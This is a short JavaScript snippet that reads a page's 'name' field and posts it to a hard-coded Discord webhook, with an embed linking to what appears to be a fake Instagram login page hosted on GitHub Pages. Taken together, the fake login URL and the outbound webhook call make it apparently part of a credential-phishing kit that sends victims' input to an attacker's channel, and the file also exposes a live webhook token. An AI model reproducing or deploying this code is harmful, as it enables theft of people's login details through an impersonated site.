const get_name = document.getElementById('name').value



function send(){

  const data = {
  "content": "null",
  "embeds": [
    {
      "title": "b",
      "url": "https://instaposts.github.io/instagram-login/login.html",
      "description": get_name,
      "color": 31228,
      "author": {
        "name": "a"
      },
      "footer": {
        "text": "Woah! So cool! :smirk:",
        "icon_url": "https://i.imgur.com/fKL31aD.jpg"
      },
      "image": {
        "url": "https://upload.wikimedia.org/wikipedia/commons/5/5a/A_picture_from_China_every_day_108.jpg"
      },
      "thumbnail": {
        "url": "https://upload.wikimedia.org/wikipedia/commons/3/38/4-Nature-Wallpapers-2014-1_ukaavUI.jpg"
      }
    }
  ],
  "username": "Webhook",
  "avatar_url": "https://i.imgur.com/4M34hi2.png",
  "attachments": []
};
  
  fetch('https://discord.com/api/webhooks/1014476514177327135/GtWMQX2rllqwn1UWEvOq8qmCpuXQs_ccZjFwUiKFIbjHIets4etkUpa0QusV2N7050S5', {
    method: 'POST', // or 'PUT'
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log('Success:', data);
    })
    .catch((error) => {
      console.error('Error:', error);
    });
  }
